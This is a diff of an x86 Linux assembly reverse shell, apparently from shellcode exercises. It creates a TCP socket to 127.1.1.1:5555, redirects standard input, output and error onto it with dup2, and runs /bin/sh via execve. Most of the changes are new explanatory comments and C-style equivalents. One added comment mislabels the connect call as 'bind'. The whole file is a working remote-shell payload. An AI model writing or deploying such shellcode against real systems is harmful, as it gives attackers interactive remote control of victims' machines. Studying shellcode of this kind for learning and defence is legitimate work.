@@ -1,65 +1,81 @@
-;Simple ASM (x86) reverse shell for 127.1.1.1 on port 5555
+;ASM (x86) reverse shell for 127.1.1.1 on port 5555
 global _start
 
 _start:
-;set the frame pointer
-mov ebp, esp
+    ;This part initialize the registers and the stack
+    mov ebp, esp        ;Initialize the stack frame
 
-;initialize registers to NULL
-xor eax, eax
-xor ebx, ebx
-xor ecx, ecx
-xor edx, edx
+    xor eax, eax        ;Initialize eax to NULL
+    xor ebx, ebx        ;Initialize ebx to NULL
+    xor ecx, ecx        ;Initialize ecx to NULL
+    xor edx, edx        ;Initialize edx to NULL
 
-;struct sockaddr_in struct
-;addr.sin_family = AF_INET;
-;addr.sin_port = htons(4444);
-;addr.sin_addr.s_addr = inet_addr("127.1.1.1");
-push eax
-push eax            ;padding for sin_zero sockaddr_in struct
-push 0x0101017f     ;initialize ip address to 127.1.1.1 
-push word 0xb315    ;port number initialize to 5555
-push word 0x02      ;network family initialize for IPv4
+    ;This part push the structure "sockaddr_in" on the stack
+    ;C code representation:
+    ;   struct sockaddr_in struct
+    ;   addr.sin_family = AF_INET;
+    ;   addr.sin_port = htons(5555);
+    ;   addr.sin_addr.s_addr = inet_addr("127.1.1.1");
+    push eax
+    push eax            ;Fill the end of the structure with 2 NULL Bytes
+    push 0x0101017f     ;Initialize the variable "addr.sin_addr.s_addr" to connect to 127.1.1.1  
+    push word 0xb315    ;Initialize the variable "addr.sin_port" to connect on port 5555 
+    push word 0x02      ;Initialize the variable "addr.sin_family" to IPV4 (AF_INET)
 
-;s = socket(AF_INET, SOCK_STREAM, 0);
-mov ax, 0x167       ;system call number for socket
-mov bl, 0x02        ;IPv4 family adress
-mov cl, 0x01        ;TCP socket
-int 0x80            ;go for it
-mov esi, eax        ;move return value (file descriptor) into esi
 
-;connect(s, (struct sockaddr *)&sa, sizeof(sa));
-xor eax, eax
-mov ax, 0x16a       ;connect system call number
-mov ebx, esi        ;file descriptor
-mov ecx, esp        ;point to the struct present in the stack
-mov edi, ebp        ;used to get the size of the structure
-sub edi, esp        ;used to get the size of the structure
-mov edx, edi        ;get the size of the struct by using a simple soustraction
-int 0x80            ;go for it
+    ;This part initialize and call the "socket" systemcall
+    mov ax, 0x167       ;Move the "socket" systemcall number inside ax
+    mov bl, 0x02        ;Move the "AF_INET" value (which means IPV4) inside bl
+    mov cl, 0x01        ;Move the "SOCK_STREAM" value (which means TCP) inside cl
 
-;for (int i = 0; i < 3; i++)
-;{
-;    dup2(connfd, i);
-;}
-xor ecx, ecx
-mov cl, 3
-boucle:
-    xor eax, eax
-    mov al, 0x3f    ;dup system call number
-    mov ebx, esi    ;mov the fd variable in ebx
-    dec cl          ;dec to cl 1
-    int 0x80        ;go for it
-    inc cl          ;inc to cl 1
-    loop boucle
+    ;C code representation of the systemcall:
+    ; --> s = socket(AF_INET, SOCK_STREAM, 0);
+    int 0x80            ;Execute the systemcall
+    mov esi, eax        ;Move the return value from the "socket" systemcall into esi
 
-;execve("/bin/sh", 0, 0);
-xor eax, eax
-push eax ;push a NULL byte
-push 0x68732f2f     ;push /bin//sh
-push 0x6e69622f     ;push /bin//sh
-mov ebx, esp        ;mov the adress of "/bin//sh" in ebx
-xor ecx, ecx        ;initialize ecx to NULL
-xor edx, edx        ;initialize edx to NULL
-mov al, 0xb         ;system call number for execve
-int 0x80            ;go for it
+
+    ;This part initialize and call the "bind" systemcall
+    xor eax, eax        ;Initialize eax to NULL
+    mov ax, 0x16a       ;Move the "connect" systemcall number inside ax
+    mov ebx, esi        ;Move the return value of "socket" inside ebx
+    mov ecx, esp        ;Point ecx to the structure
+    ;Get the structure size
+    mov edx, ebp        
+    sub edx, esp        ;Use the stack pointers (esp and ebp to calculate the size of the structure)
+    
+    ;C code representation of the systemcall:
+    ; --> connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    int 0x80            ;Execute systemcall
+
+
+    ;This part redirect the STDIN, STDOUT and STDERR into the socket
+    xor ecx, ecx        ;Initialize ecx to NULL
+    mov cl, 3           ;Initialize cl to 3
+    boucle:
+        xor eax, eax    ;Initialize eax to NULL
+        mov al, 0x3f    ;Move the "dup2" systemcall number inside al
+        mov ebx, esi    ;Move the return value of "socket" in ebx
+        dec cl          ;Decrement cl to 1
+
+        ;C code representation of the systemcall:
+        ;for (int i = 0; i < 3; i++)
+        ;{
+        ;    dup2(s, i);
+        ;}
+        int 0x80        ;Execute systemcall
+        inc cl          ;Increment cl to 1
+        loop boucle     ;Loop three times until cl is equal to 0
+
+
+    ;This part initialize and call the "execve" systemcall
+    xor eax, eax        ;Initialize eax to NULL
+    push eax            ;Push a NULL Byte on the stack
+    push 0x68732f2f     
+    push 0x6e69622f     ;push "/bin//sh" on the stack
+    mov ebx, esp        ;Initialize ebx to "/bin//sh%00"
+    xor ecx, ecx        ;Initialize ecx to NULL
+    xor edx, edx        ;Initialize edx to NULL
+    mov al, 0xb         ;Move the "execve" systemcall number inside al
+    ;C code representation of the systemcall:
+    ; --> execve("/bin/sh", NULL, NULL);
+    int 0x80            ;Execute systemcall
